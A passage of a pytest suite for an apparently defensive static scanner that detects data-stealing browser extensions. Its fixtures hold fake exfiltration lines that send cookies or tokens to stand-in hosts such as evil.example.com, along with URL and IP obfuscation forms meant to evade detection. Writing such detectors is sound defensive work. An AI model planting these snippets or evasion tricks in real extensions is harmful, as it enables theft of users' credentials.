            "navigator.sendBeacon('https://beacon.example.org/b', document.cookie);\n")


def test_h3_referenced_code_in_build_dirs_is_scanned(tmp_path, capsys):
    ext = write_tree(tmp_path / "ext", {
        "manifest.json": mv3(background={"service_worker": "dist/bg.js"},
                             content_scripts=[{"matches": ["https://shop.example.com/*"], "js": ["build/content.js"]}],
                             action={"default_popup": "node_modules/ui/popup.html"}),
        "dist/bg.js": EXFIL_JS,
        "build/content.js": "new Image().src = 'https://pixel.example.org/p?c=' + document.cookie;\n",
        "node_modules/ui/popup.html": '<html><script src="popup.js"></script></html>',
        "node_modules/ui/popup.js": "fetch('https://popup.example.net/x', {body: localStorage.token});\n",
        "node_modules/unused/index.js": "fetch('https://unused.example.com/x');\n",
    })
    report = ext_exfil.analyze(ext)
    names = {h["host"] for h in report["hosts"]}
    assert {"collect.example.net", "beacon.example.org", "pixel.example.org", "popup.example.net"} <= names
    # node_modules is walked (it holds a referenced file) ...
    assert "unused.example.com" in names
    assert {"exfil.sensitive-source-to-external-sink", "exfil.beacon-or-pixel"} <= ids(report["findings"])
    assert ext_exfil.main([str(ext)]) == 1
    capsys.readouterr()


def test_h3_dist_and_build_are_walked_and_vendored_dirs_are_named(tmp_path):
    ext = write_tree(tmp_path / "ext", {
        "manifest.json": mv3(),
        "dist/chunk.js": "fetch('https://dist.example.net/x');\n",
        "build/chunk.js": "fetch('https://build.example.net/x');\n",
        "node_modules/lib/i.js": "fetch('https://vendored.example.com/x');\n",
    })
    report = ext_exfil.analyze(ext)
    names = {h["host"] for h in report["hosts"]}
    assert {"dist.example.net", "build.example.net"} <= names and "vendored.example.com" not in names
    assert any(lim.startswith("node_modules: vendored/tooling directory not walked") for lim in report["limitations"])
    walked = ext_exfil.analyze(ext, include_vendored=True)
    assert "vendored.example.com" in {h["host"] for h in walked["hosts"]}


def test_h3_files_referenced_by_scanned_code_are_scanned(tmp_path):
    ext = write_tree(tmp_path / "ext", {
        "manifest.json": mv3(background={"service_worker": "sw.js"}, host_permissions=["<all_urls>"]),
        "sw.js": ("importScripts('node_modules/a/stage.js');\n"
                  "import './node_modules/b/mod.js';\n"
                  "chrome.scripting.executeScript({target: {tabId: 1}, files: ['node_modules/c/inject.js']});\n"),
        "node_modules/a/stage.js": "fetch('https://stage.example.net/x');\n",
        "node_modules/b/mod.js": "fetch('https://mod.example.net/x');\n",
        "node_modules/c/inject.js": "fetch('//inject.example.org/c?d=' + document.cookie);\n",
    })
    report = ext_exfil.analyze(ext)
    assert {"stage.example.net", "mod.example.net", "inject.example.org"} <= {h["host"] for h in report["hosts"]}
    # An injected file runs as a content script: its protocol-relative URL reaches the network.
    assert host(report, "inject.example.org")["class"] == "external"


def test_h3_missing_manifest_reference_is_noted(tmp_path):
    ext = write_tree(tmp_path / "ext", {"manifest.json": mv3(background={"service_worker": "gone.js"})})
    report = ext_exfil.analyze(ext)
    assert any("manifest background file gone.js is not a regular file" in lim for lim in report["limitations"])


# --- M1: DNR rule_resources path must not hide code ------------------------------------------------

def test_m1_rule_resource_path_does_not_suppress_source_scan(tmp_path, capsys):
    ext = write_tree(tmp_path / "ext", {
        "manifest.json": mv3(background={"service_worker": "bg.js"},
                             declarative_net_request={"rule_resources": [{"id": "x", "enabled": False, "path": "bg.js"}]}),
        "bg.js": EXFIL_JS,
    })
    report = ext_exfil.analyze(ext)
    assert report["stats"]["files_scanned"] == 1
    assert "exfil.sensitive-source-to-external-sink" in ids(report["findings"])
    assert any("bg.js is not valid JSON" in lim and "scanned as a source file instead" in lim for lim in report["limitations"])
    assert ext_exfil.main([str(ext)]) == 1
    capsys.readouterr()


def test_m1_undeclared_invalid_rule_json_is_still_scanned(tmp_path):
    ext = write_tree(tmp_path / "ext", {
        "manifest.json": mv3(declarative_net_request={"rule_resources": [{"path": "r.json"}]}),
        "r.json": '{"u": "https://hidden.example.net/x"}',
    })
    assert "hidden.example.net" in {h["host"] for h in ext_exfil.analyze(ext)["hosts"]}


# --- M2: rule resources beyond the old 50 cap -------------------------------------------------------

def _many_rulesets(tmp_path, n):
    files = {}
    for i in range(n):
        rules = []
        if i == n - 1:
            rules = [{"id": 1, "action": {"type": "redirect", "redirect": {"url": "https://redirect.example.net/r"}},
                      "condition": {"urlFilter": "*"}},
                     {"id": 2, "action": {"type": "modifyHeaders", "responseHeaders": [
                         {"header": "content-security-policy", "operation": "remove"}]}, "condition": {"urlFilter": "*"}}]
        files[f"rules/r{i}.json"] = rules
    files["manifest.json"] = mv3(declarative_net_request={"rule_resources": [
        {"id": f"r{i}", "enabled": True, "path": f"rules/r{i}.json"} for i in range(n)]})
    return write_tree(tmp_path / "ext", files)


def test_m2_51st_ruleset_is_analyzed(tmp_path):
    report = ext_exfil.analyze(_many_rulesets(tmp_path, 51))
    assert ("content-security-policy", "remove") in {(t["header"], t["operation"]) for t in report["header_tampering"]}
    assert "exfil.dnr-redirect-external" in ids(report["findings"])
    assert ext_exfil.has_failing_findings(report)


def test_m2_truncation_and_budget_are_reported(tmp_path, monkeypatch):
    ext = _many_rulesets(tmp_path, 5)
    monkeypatch.setattr(ext_exfil, "MAX_RULE_RESOURCES", 3)
    report = ext_exfil.analyze(ext)
    assert any("declares 5 rule resources; only the first 3" in lim and "NOT reported" in lim for lim in report["limitations"])
    monkeypatch.setattr(ext_exfil, "MAX_RULE_RESOURCES", 1000)
    monkeypatch.setattr(ext_exfil, "MAX_RULE_TOTAL_BYTES", 4)
    report = ext_exfil.analyze(ext)
    assert any("total rule-file budget" in lim for lim in report["limitations"])


# --- M3: WHATWG URL forms, dynamic sinks, case-insensitive literals --------------------------------

def test_m3_split_url_whatwg_forms():
    su = ext_exfil.split_url
    assert su("https:evil.example.com/c") == ("https", "evil.example.com")
    assert su("https:/\\evil.example.com/c") == ("https", "evil.example.com")
    assert su("HTTPS://UPPER.example.net/c") == ("https", "upper.example.net")
    assert su("/\\evil.example.org/b") == ("protocol-relative", "evil.example.org")
    assert su("\\\\evil.example.org/b") == ("protocol-relative", "evil.example.org")
    assert su(" https://a\t.exam\nple.com/") == ("https", "a.example.com")
    assert su("https://%65vil.example.com/") == ("https", "evil.example.com")
    assert su("https://") == ("https", "")
    assert su("data:text/plain,x") == ("data", "") and su("./x.js") is None


def test_m3_obfuscated_and_dynamic_sinks_are_reported(tmp_path):
    bg = "\n".join([
        "chrome.cookies.getAll({}, () => {});",
        "fetch('https:evil.example.com/c');",                          # 2
        "fetch(`${BASE}/x`);",                                         # 3 dynamic
        "fetch('//' + h);",                                            # 4 dynamic
        "navigator.sendBeacon('/\\\\evil.example.org/b', 'x');",        # 5  (JS source: '/\\evil...')
        "const u = 'HTTPS://upper.example.net/c';",                    # 6 literal
        "fetch('https://\\x65vil2.example.com/c');",                   # 7  (JS escape \x65 = e)
        "fetch('https://' + host + '/p');",                            # 8 dynamic
        "fetch('/api/' + id);",                                        # 9 relative: internal
    ])
    ext = write_tree(tmp_path / "ext", {
        "manifest.json": mv3(host_permissions=["<all_urls>"],
                             content_scripts=[{"matches": ["<all_urls>"], "js": ["bg.js"]}]),
        "bg.js": bg,
    })
    report = ext_exfil.analyze(ext)
    names = {h["host"] for h in report["hosts"]}
    assert {"evil.example.com", "evil.example.org", "upper.example.net", "evil2.example.com"} <= names
    dyn_lines = sorted(e["line"] for e in report["endpoints"] if e["host"] == "<dynamic>")
    assert dyn_lines == [3, 4, 8]
    found = ids(report["findings"])
    assert {"exfil.sensitive-source-to-external-sink", "exfil.dynamic-endpoint", "exfil.beacon-or-pixel"} <= found


# --- M4: IPv4-mapped / 6to4 IPv6 and WHATWG IPv4 number forms --------------------------------------

def test_m4_mapped_ipv6_and_ipv4_forms_are_classified():
    assert ext_exfil.classify_host("::ffff:203.0.113.9") == "external"     # was "local"
    assert ext_exfil.classify_host("::ffff:10.0.0.1") == "local"
    assert ext_exfil.classify_host("2002:cb00:7109::1") == "external"      # 6to4 of 203.0.113.9
    assert ext_exfil.is_reserved_example("::ffff:198.51.100.7")
    target = "203.0.113.9"
    n = int(ipaddress.IPv4Address(target))
    for form in (str(n), hex(n), "0xcb.0.0x71.9", "0313.0.113.9", "203.0.28937", "203.0.28937."):
        assert ext_exfil.split_url(f"http://{form}/x") == ("http", target), form
    assert ext_exfil.split_url("http://0x7f.1/") == ("http", "127.0.0.1")
    assert ext_exfil.whatwg_ipv4("1.2.3.4.5") is None and ext_exfil.whatwg_ipv4("09.1.1.1") is None
    assert ext_exfil.whatwg_ipv4("example.com") is None


def test_m4_mapped_and_decimal_ip_endpoints_raise_findings(tmp_path):
    n = int(ipaddress.IPv4Address("203.0.113.9"))
    ext = write_tree(tmp_path / "ext", {"manifest.json": mv3(), "a.js": (
        "fetch('http://[::ffff:203.0.113.9]/u', {body: document.cookie});\n"
        f"fetch('http://{n}/v', {{body: document.cookie}});\n")})
    report = ext_exfil.analyze(ext)
    found = ids(report["findings"])
    assert {"exfil.raw-ip-endpoint", "exfil.cleartext-endpoint", "exfil.sensitive-source-to-external-sink"} <= found
    external = {h["host"] for h in report["hosts"] if h["class"] == "external"}
    assert "203.0.113.9" in external                                  # decimal form normalized
    assert any(h.startswith("::ffff:") for h in external)             # mapped form kept, classed external


# --- M5: junction loops without os.path.isjunction, early cap stop, Python floor -------------------

def _run_with_timeout(fn, seconds=30.0):
    box = {}

    def target():
        try:
            box["value"] = fn()
        except BaseException as exc:  # surfaced below
            box["error"] = exc

    t = threading.Thread(target=target, daemon=True)
    t.start()
    t.join(seconds)
    assert not t.is_alive(), "analysis did not finish (directory loop?)"
    if "error" in box:
        raise box["error"]
    return box["value"]


@pytest.mark.skipif(sys.platform != "win32", reason="NTFS junctions exist only on Windows")
@pytest.mark.parametrize("disable", ["isjunction", "all-link-checks"])
def test_m5_inside_junction_loop_terminates(tmp_path, monkeypatch, disable):
    import _winapi
    ext = write_tree(tmp_path / "ext", {"manifest.json": mv3(), "a/x.js": "fetch('https://loop.example.net/x');\n"})
    _winapi.CreateJunction(str(ext / "a"), str(ext / "a" / "j1"))
    _winapi.CreateJunction(str(ext / "a"), str(ext / "a" / "j2"))
    monkeypatch.delattr(os.path, "isjunction", raising=False)            # simulate Python 3.8-3.11
    if disable == "all-link-checks":                                      # only the visited-inode guard is left
        monkeypatch.setattr(ext_exfil, "_is_link_or_junction", lambda p: False)
    report = _run_with_timeout(lambda: ext_exfil.analyze(ext))
    assert report["stats"]["files_scanned"] == 1
    assert host(report, "loop.example.net")["references"] == 1
    note = "symlink/junction directory, not followed" if disable == "isjunction" else "already visited"
    assert any(note in lim for lim in report["limitations"])


def test_m5_walk_stops_at_the_file_cap(tmp_path):
    ext = write_tree(tmp_path / "ext", dict({"manifest.json": mv3()},
                                            **{f"d{i:02d}/f.js": "console.log(1);\n" for i in range(30)}))
    report = ext_exfil.analyze(ext, max_files=5)
    assert report["stats"]["files_scanned"] == 5
    assert any("--max-files cap reached" in lim and "NOT scanned" in lim for lim in report["limitations"])


def test_m5_python_floor_is_enforced(clean, monkeypatch, capsys):
    monkeypatch.setattr(ext_exfil, "MIN_PYTHON", (99, 0))
    assert ext_exfil.main([str(clean)]) == 2
    assert "Python 99.0+ is required" in capsys.readouterr().err


def test_m7_symlinked_file_pointing_outside_is_not_read(tmp_path):
    outside, ext = _outside_and_ext(tmp_path)
    try:
        os.symlink(outside / "lib.js", ext / "lib.js")
    except (OSError, NotImplementedError) as exc:
        pytest.skip(f"symlinks not permitted here: {exc}")
    report = ext_exfil.analyze(ext)
    assert "outside.example.org" not in {h["host"] for h in report["hosts"]}
    assert any("lib.js: symlink" in lim for lim in report["limitations"])


# --- M6: read-only onHeadersReceived ----------------------------------------------------------------

def _headers_ext(tmp_path, body):
    return write_tree(tmp_path / "ext", {"manifest.json": {"manifest_version": 2, "name": "H", "version": "1",
                                                           "permissions": ["webRequest", "<all_urls>"]}, "bg.js": body})


def test_m6_read_only_on_headers_received_is_low(tmp_path):
    body = ("chrome.webRequest.onHeadersReceived.addListener(d => {\n"
            "  console.log(d.responseHeaders.find(h => h.name === 'x-frame-options'));\n"
            "  console.log(d.responseHeaders.find(h => h.name === 'x-frame-options'));\n"
            "}, {urls: ['<all_urls>']}, ['responseHeaders']);\n")
    report = ext_exfil.analyze(_headers_ext(tmp_path, body))
    entries = [t for t in report["header_tampering"] if t["id"] == "csp.webrequest-header-tampering"]
    assert len(entries) == 1                                            # de-duplicated per header
    assert entries[0]["severity"] == "low" and entries[0]["operation"] == "read"
    assert not ext_exfil.has_failing_findings(report)


def test_m6_blocking_listener_severity(tmp_path):
    blocking_no_return = ("chrome.webRequest.onHeadersReceived.addListener(d => { log(d.responseHeaders, "
                          "'content-security-policy'); }, {urls: ['<all_urls>']}, ['blocking', 'responseHeaders']);\n")
    entries = ext_exfil.analyze(_headers_ext(tmp_path, blocking_no_return))["header_tampering"]
    assert [t["severity"] for t in entries] == ["medium"]


# --- L1-L3: CSP and DNR severities -----------------------------------------------------------------

def test_l1_other_extension_source_is_not_remote(tmp_path):
    ext = write_tree(tmp_path / "ext", {"manifest.json": {"manifest_version": 2, "name": "E", "version": "1",
        "content_security_policy": "script-src 'self' chrome-extension://abcdefghijklmnopabcdefghijklmnop; object-src 'self'"}})
    relax = ext_exfil.analyze(ext)["csp"]["relaxations"]
    assert ids(relax) == {"csp.other-extension-script-source"} and relax[0]["severity"] == "low"
    assert not ext_exfil._remote_source("chrome-extension://abc") and not ext_exfil._remote_source("moz-extension://x.y")


def test_l2_unsafe_inline_with_hash_or_nonce_is_low(tmp_path):
    ext = write_tree(tmp_path / "ext", {"manifest.json": mv3(content_security_policy={
        "sandbox": "sandbox allow-scripts; script-src 'self' 'unsafe-inline' 'sha256-AAAA'; object-src 'none'"})})
    relax = ext_exfil.analyze(ext)["csp"]["relaxations"]
    inline = next(r for r in relax if r["id"] == "csp.unsafe-inline")
    assert inline["severity"] == "low" and "nonce, hash" in inline["effect"]


def test_l3_dnr_csp_append_and_scheme_downgrade(tmp_path):
    rules = [
        {"id": 1, "action": {"type": "modifyHeaders", "responseHeaders": [
            {"header": "content-security-policy", "operation": "append", "value": "frame-ancestors 'none'"}]}},
        {"id": 2, "action": {"type": "redirect", "redirect": {"transform": {"scheme": "http"}}}},
        {"id": 3, "action": {"type": "redirect", "redirect": {"transform": {"host": "mirror.example.net"}}}},
    ]
    ext = write_tree(tmp_path / "ext", {"manifest.json": mv3(declarative_net_request={"rule_resources": [{"path": "r.json"}]}),
                                        "r.json": rules})
    report = ext_exfil.analyze(ext)
    append = next(t for t in report["header_tampering"] if t["operation"] == "append")
    assert append["severity"] == "info" and "only tighten" in append["effect"]
    assert "exfil.dnr-scheme-downgrade" in ids(report["findings"])
    mirror = host(report, "mirror.example.net")
    assert mirror["schemes"] == ["protocol-relative"]                 # transform keeps the request's scheme
    assert not any(f["id"] == "exfil.cleartext-endpoint" for f in report["findings"])


# --- L4: protocol-relative in extension contexts -----------------------------------------------------

def test_l4_protocol_relative_in_background_is_extension_origin(tmp_path, capsys):
    ext = write_tree(tmp_path / "ext", {
        "manifest.json": mv3(background={"service_worker": "sw.js"}, action={"default_popup": "popup.html"}),
        "sw.js": "importScripts('//cdn.example.org/a.js');\n",
        "popup.html": '<script src="//cdn.example.org/b.js"></script>',
    })
    report = ext_exfil.analyze(ext)
    assert host(report, "cdn.example.org")["class"] == "extension-origin"
    assert report["findings"] == [] and not ext_exfil.has_failing_findings(report)
    assert ext_exfil.main([str(ext)]) == 0
    assert "extension-origin" in capsys.readouterr().out


# --- L5: vendor label --------------------------------------------------------------------------------

def test_l5_vendor_label_is_not_widened_to_the_parent_domain(tmp_path):
    ext = write_tree(tmp_path / "ext", {
        "manifest.json": mv3(homepage_url="https://attacker.shared.example/"),
        "a.js": "fetch('https://victim.shared.example/x'); fetch('https://api.attacker.shared.example/y');\n",
    })
    report = ext_exfil.analyze(ext)
    assert report["target"]["vendor_domains"] == ["attacker.shared.example"]
    assert host(report, "victim.shared.example")["class"] == "external"
    assert host(report, "api.attacker.shared.example")["class"] == "vendor"
    assert "not a trust signal" in ext_exfil.render(report, "text")


# --- L6: manifest URL fields ---------------------------------------------------------------------------

def test_l6_search_provider_and_startup_pages_are_inventoried(tmp_path, capsys):
    ext = write_tree(tmp_path / "ext", {"manifest.json": mv3(chrome_settings_overrides={
        "search_provider": {"name": "S", "search_url": "https://search.example.net/?q={searchTerms}",
                            "suggest_url": "https://suggest.example.net/?q={searchTerms}", "is_default": True},
        "homepage": "https://home.example.org/", "startup_pages": ["https://start.example.org/"]})})
    report = ext_exfil.analyze(ext)
    assert {"search.example.net", "suggest.example.net", "home.example.org", "start.example.org"} <= {h["host"] for h in report["hosts"]}
    assert "exfil.search-provider-override" in ids(report["findings"])
    assert ext_exfil.main([str(ext)]) == 1
    capsys.readouterr()


# --- L7: invisible characters and IDN hosts --------------------------------------------------------------

def test_l7_invisible_characters_and_idn_hosts(tmp_path):
    idn = f"g{CYR_O}{CYR_O}gle.example"
    ext = write_tree(tmp_path / "ext", {
        "manifest.json": mv3(name=f"Na{TAG_A}me{SHY}"),
        "a.js": f"fetch('https://{idn}/c' + document.cookie); // {TAG_A}\n",
    })
    report = ext_exfil.analyze(ext)
    h = next(x for x in report["hosts"] if x["unicode_host"])
    assert h["host"].startswith("xn--") and h["host"].isascii() and h["unicode_host"] == idn
    assert any("homoglyph" in lim for lim in report["limitations"])
    for fmt in ("text", "md"):
        out = ext_exfil.render(report, fmt)
        assert TAG_A not in out and SHY not in out
        hosts_section = out.split("External hosts statically referenced")[1].split("Exfiltration findings")[0]
        assert CYR_O not in hosts_section and "non-ASCII IDN" in hosts_section and h["host"] in hosts_section
        assert "\\U000e0041" in out and "\\xad" in out


# --- L8: storage-only source ------------------------------------------------------------------------------

def test_l8_storage_only_source_is_medium(tmp_path):
    ext = write_tree(tmp_path / "ext", {"manifest.json": mv3(), "opt.js": (
        "chrome.storage.sync.get('apiKey', v => fetch('https://api.example.net/x', {headers: {k: v.apiKey}}));\n")})
    f = next(x for x in ext_exfil.analyze(ext)["findings"] if x["id"] == "exfil.sensitive-source-to-external-sink")
    assert f["severity"] == "medium" and "stored extension/page data" in f["message"]


# =================================================================================================
# Regression tests for the second independent review of v1.1.0 (issues M-a..M-d, L-a..L-e and the
# partial H3/M4/L5/L6 residuals). Synthetic fixtures, reserved example hosts / documentation IPs.
# =================================================================================================

def test_ma_long_attribute_padding_does_not_hide_script_src(tmp_path, capsys):
    pad = "A" * 5000
    ext = write_tree(tmp_path / "ext", {
        "manifest.json": mv3(action={"default_popup": "popup.html"}),
        "popup.html": (f'<script data-x="{pad}" src="https://cdn.example.net/a.js"></script>'
                       f'<script data-y="{pad}" src=https://cdn2.example.net/b.js></script>'
                       f'<script title="a>b" src="https://cdn3.example.net/c.js"></script>'
                       f'<script data-z="{pad}" src="node_modules/x/a.js"></script>'),
        "node_modules/x/a.js": "fetch('https://hidden.example.org/x', {body: document.cookie});\n",
    })
    report = ext_exfil.analyze(ext)
    for h in ("cdn.example.net", "cdn2.example.net", "cdn3.example.net"):
        assert "html-script" in host(report, h)["kinds"], h
    assert "exfil.remote-code" in ids(report["findings"])
    assert "hidden.example.org" in {h["host"] for h in report["hosts"]}    # padded local script still followed
    assert ext_exfil.main([str(ext)]) == 1
    capsys.readouterr()


def test_ld_attribute_text_inside_another_value_is_not_a_url():
    eps = ext_exfil.scan_source("p.html", '<img alt=" src=https://fp.example.net/x" src="local.png">')["endpoints"]
    assert not any(e["kind"] == "html-img" for e in eps)


@pytest.mark.parametrize("unit", ["<img " + "a" * 2_000_000, "<img title=\"" + "a" * 2_000_000, "<img a=\"x\" " * 150_000])
def test_ma_html_tokenizer_stays_linear_on_huge_tags(unit):
    start = time.perf_counter()
    ext_exfil.scan_source("p.html", unit)
    assert time.perf_counter() - start < 5.0


def test_mb_header_stripping_with_enum_or_external_spec_is_not_low(tmp_path):
    enum_body = ("const O = chrome.webRequest.OnHeadersReceivedOptions;\n"
                 "chrome.webRequest.onHeadersReceived.addListener(d => { return {responseHeaders: d.responseHeaders"
                 ".filter(h => h.name.toLowerCase() !== 'content-security-policy')}; }, {urls: ['<all_urls>']},"
                 " [O.BLOCKING, O.RESPONSE_HEADERS]);\n")
    t = ext_exfil.analyze(_headers_ext(tmp_path / "a", enum_body))["header_tampering"]
    assert [x["severity"] for x in t] == ["high"]
    spec_elsewhere = ("chrome.webRequest.onHeadersReceived.addListener(d => { return {responseHeaders: d.responseHeaders"
                      ".filter(h => h.name !== 'x-frame-options')}; }, {urls: ['<all_urls>']}, SPEC);\n")
    t = ext_exfil.analyze(_headers_ext(tmp_path / "b", spec_elsewhere))["header_tampering"]
    assert [x["severity"] for x in t] == ["medium"]


def test_mc_single_line_minified_file_is_linear_and_bounded(tmp_path):
    text = "fetch(x);" * (2 * 1024 * 1024 // 9)                 # one 2 MiB line, ~233k call sites
    start = time.perf_counter()
    res = ext_exfil.scan_source("m.js", text)
    assert time.perf_counter() - start < 5.0
    # Runtime-built repeats past the soft cap are collapsed, not lost: no distinct host is hidden.
    assert len(res["endpoints"]) == ext_exfil.MAX_ENDPOINTS_PER_FILE and res["collapsed_endpoints"] > 0
    assert res["dropped_endpoints"] == 0
    ext = write_tree(tmp_path / "ext", {"manifest.json": mv3(), "m.js": text})
    report = ext_exfil.analyze(ext)
    assert any("were collapsed" in lim for lim in report["limitations"])
    assert "analysis.incomplete-coverage" not in ids(report["findings"])


def test_mc_hard_cap_of_distinct_hosts_is_an_incomplete_analysis(tmp_path, monkeypatch):
    monkeypatch.setattr(ext_exfil, "MAX_ENDPOINTS_PER_FILE", 5)
    monkeypatch.setattr(ext_exfil, "MAX_ENDPOINTS_HARD_CAP", 8)
    text = "".join(f"fetch('https://h{i}.example.net/x');\n" for i in range(12))
    ext = write_tree(tmp_path / "ext", {"manifest.json": mv3(), "m.js": text})
    report = ext_exfil.analyze(ext)
    assert any("NOT recorded" in lim for lim in report["limitations"])
    assert "analysis.incomplete-coverage" in ids(report["findings"])


def test_md_long_digit_hosts_do_not_abort_the_analysis(tmp_path, capsys):
    rules = [{"id": 1, "action": {"type": "redirect", "redirect": {"url": "https://" + "1" * 5000}}},
             {"id": 2, "action": {"type": "redirect", "redirect": {"transform": {"host": "1" * 4400}}}}]
    ext = write_tree(tmp_path / "ext", {
        "manifest.json": mv3(homepage_url="http://" + "9" * 5000, declarative_net_request={"rule_resources": [{"path": "r.json"}]}),
        "r.json": rules, "a.js": EXFIL_JS})
    report = ext_exfil.analyze(ext)
    assert "exfil.sensitive-source-to-external-sink" in ids(report["findings"])
    assert ext_exfil.whatwg_ipv4("9" * 5000) is None and ext_exfil.whatwg_ipv4("0x" + "f" * 5000) is None
    assert ext_exfil.whatwg_ipv4("0" * 50 + "1.0.0.1") is not None      # leading zeros are still octal 0..1
    assert ext_exfil.main([str(ext)]) == 1
    capsys.readouterr()


def test_m4_teredo_and_nat64_embedded_ipv4(tmp_path):
    teredo = "2001:0:c000:201::34ff:8ef6"                 # server 192.0.2.1, client 203.0.113.9 (obfuscated)
    for addr in (teredo, "64:ff9b::cb00:7109", "64:ff9b:1::cb00:7109"):
        assert ext_exfil.classify_host(addr) == "external", addr
        assert ext_exfil.is_reserved_example(addr), addr
    assert ext_exfil.classify_host("64:ff9b::a00:1") == "local"          # NAT64 of 10.0.0.1
    ext = write_tree(tmp_path / "ext", {"manifest.json": mv3(), "a.js": (
        f"fetch('http://[{teredo}]/u', {{body: document.cookie}});\n")})
    assert "exfil.sensitive-source-to-external-sink" in ids(ext_exfil.analyze(ext)["findings"])


@pytest.mark.parametrize("loader", [
    "new Worker('node_modules/x/p.js');",
    "const s = document.createElement('script'); s.src = 'node_modules/x/p.js';",
    "chrome.offscreen.createDocument({url: 'node_modules/x/p.html', reasons: ['DOM_PARSER'], justification: 'x'});",
    "chrome.tabs.executeScript({file: 'node_modules/x/p.js'});",
    "importScripts('a.js', 'node_modules/x/p.js');",
    "fetch(chrome.runtime.getURL('node_modules/x/p.js'));",
    "new Worker('node_modules/x/%70.js');",
])
def test_h3_other_reference_forms_reach_vendored_code(tmp_path, loader):
    ext = write_tree(tmp_path / "ext", {
        "manifest.json": mv3(background={"service_worker": "sw.js"}),
        "sw.js": loader + "\n", "a.js": "\n",
        "node_modules/x/p.js": "fetch('https://hidden.example.org/x', {body: document.cookie});\n",
        "node_modules/x/p.html": '<script src="p.js"></script>',
    })
    report = ext_exfil.analyze(ext)
    assert "hidden.example.org" in {h["host"] for h in report["hosts"]}, loader
    assert "exfil.sensitive-source-to-external-sink" in ids(report["findings"])


def test_l5_bare_tld_homepage_is_not_a_vendor_scope(tmp_path):
    ext = write_tree(tmp_path / "ext", {"manifest.json": mv3(homepage_url="https://com/"),
                                        "a.js": "fetch('https://collect.example.com/x');\n"})
    report = ext_exfil.analyze(ext)
    assert report["target"]["vendor_domains"] == []
    assert host(report, "collect.example.com")["class"] == "external"


def test_l6_alternate_urls_and_gecko_update_url(tmp_path):
    ext = write_tree(tmp_path / "ext", {"manifest.json": mv3(
        chrome_settings_overrides={"search_provider": {"search_url": "https://s.example.net/?q={searchTerms}",
                                                       "alternate_urls": ["https://alt.example.net/?q={searchTerms}"]}},
        browser_specific_settings={"gecko": {"id": "x@example.org", "update_url": "https://upd.example.org/u.json"}})})
    names = {h["host"] for h in ext_exfil.analyze(ext)["hosts"]}
    assert {"alt.example.net", "upd.example.org"} <= names


def test_la_output_file_with_lone_surrogate(tmp_path):
    ext = tmp_path / "ext"
    ext.mkdir()
    (ext / "manifest.json").write_text('{"manifest_version": 3, "name": "a\\ud800b", "version": "1"}', encoding="utf-8")
    for fmt in ("text", "md", "json"):
        out = tmp_path / f"r.{fmt}"
        assert ext_exfil.main([str(ext), "--format", fmt, "-o", str(out)]) == 0, fmt
        assert "ud800" in out.read_text(encoding="utf-8")


def test_lb_url_in_variable_is_a_medium_lead(tmp_path):
    ext = write_tree(tmp_path / "ext", {"manifest.json": mv3(), "a.js": (
        "const u = 'https://collect.example.net/c';\nfetch(u, {method: 'POST', body: document.cookie});\n")})
    report = ext_exfil.analyze(ext)
    f = next(x for x in report["findings"] if x["id"] == "exfil.sensitive-source-to-possible-sink")
    assert f["severity"] == "medium" and "collect.example.net" in f["message"]
    assert ext_exfil.has_failing_findings(report)


def test_lc_capped_analysis_is_not_reported_clean(tmp_path, capsys):
    ext = write_tree(tmp_path / "ext", dict({"manifest.json": mv3()}, **{f"f{i}.js": "console.log(1);\n" for i in range(4)}))
    report = ext_exfil.analyze(ext, max_files=2)
    assert "analysis.incomplete-coverage" in ids(report["findings"])
    assert ext_exfil.main([str(ext), "--max-files", "2"]) == 1
    assert ext_exfil.main([str(ext)]) == 0                              # complete analysis: clean
    capsys.readouterr()


def test_le_nan_manifest_version_keeps_json_valid(tmp_path, capsys):
    ext = tmp_path / "ext"
    ext.mkdir()
    (ext / "manifest.json").write_text('{"manifest_version": NaN, "name": "n", "version": "1"}', encoding="utf-8")
    assert ext_exfil.main([str(ext), "--format", "json"]) == 0
    data = json.loads(capsys.readouterr().out, parse_constant=lambda c: pytest.fail(f"non-standard JSON constant {c}"))
    assert data["target"]["manifest_version"] == "nan"


# =================================================================================================
# Regression tests for the third review pass (N1 quadratic attribute tokenizer, N2 stray quotes
# swallowing tags, M-b/H3 residuals, endpoint-cap and coverage-marker lows).
# =================================================================================================

@pytest.mark.parametrize("text", [
    "<img " + " " * 2_000_000,                        # review: 100 KB took 68 s
    "<img " + "/" * 2_000_000,
    ("<img" + " " * 4000 + ">") * 500,                # review: 56 s per 2 MiB file
    "<img a=\"" + "b " * 1_000_000,                   # unclosed quoted value
    "<!--" * 500_000,                                 # unclosed comments
    "<script>" * 250_000,                             # unclosed raw-text elements
    "<img a=" * 280_000,
])
def test_n1_html_scan_is_linear_on_separator_runs(text):
    start = time.perf_counter()
    ext_exfil.scan_source("p.html", text)
    assert time.perf_counter() - start < 5.0


@pytest.mark.parametrize("before,after", [
    ("<script>var a='<img title=\"';</script>", "<script>var b='\"';</script>"),     # quote in inline script
    ("<!-- <img alt=\" -->", "<!-- \" -->"),                                          # quote in a comment
    ("<img src=\"x.png\" alt=it's>", "<p>We're done</p>"),                            # natural apostrophe
])
def test_n2_stray_quotes_do_not_swallow_the_next_script(tmp_path, capsys, before, after):
    ext = write_tree(tmp_path / "ext", {
        "manifest.json": mv3(action={"default_popup": "popup.html"}),
        "popup.html": before + '<script src="https://cdn.example.net/evil.js"></script>'
                      + '<script src="node_modules/x/a.js"></script>' + after,
        "node_modules/x/a.js": "fetch('https://hidden.example.org/x', {body: document.cookie});\n",
    })
    report = ext_exfil.analyze(ext)
    assert "html-script" in host(report, "cdn.example.net")["kinds"]
    assert "exfil.remote-code" in ids(report["findings"])
    assert "hidden.example.org" in {h["host"] for h in report["hosts"]}
    assert ext_exfil.main([str(ext)]) == 1
    capsys.readouterr()


def test_n2_masking_keeps_offsets_and_inline_script_sinks():
    html_text = "<p>\n<!-- c -->\n<script>\nfetch('https://inline.example.net/x');\n</script>\n"
    masked = ext_exfil._mask_html(html_text)
    assert len(masked) == len(html_text) and masked.count("\n") == html_text.count("\n")
    eps = ext_exfil.scan_source("p.html", html_text)["endpoints"]
    assert [(e["kind"], e["line"]) for e in eps if "inline" in e["url"]] == [("fetch", 4)]


def test_mb_response_headers_object_built_before_return(tmp_path):
    body = ("chrome.webRequest.onHeadersReceived.addListener(d => { const r = {responseHeaders: d.responseHeaders"
            ".filter(h => h.name !== 'content-security-policy')}; return r; }, {urls: ['<all_urls>']}, SPEC);\n")
    t = ext_exfil.analyze(_headers_ext(tmp_path, body))["header_tampering"]
    assert [x["severity"] for x in t] == ["medium"]


@pytest.mark.parametrize("loader", [
    "new Worker(new URL('./node_modules/x/p.js', import.meta.url));",
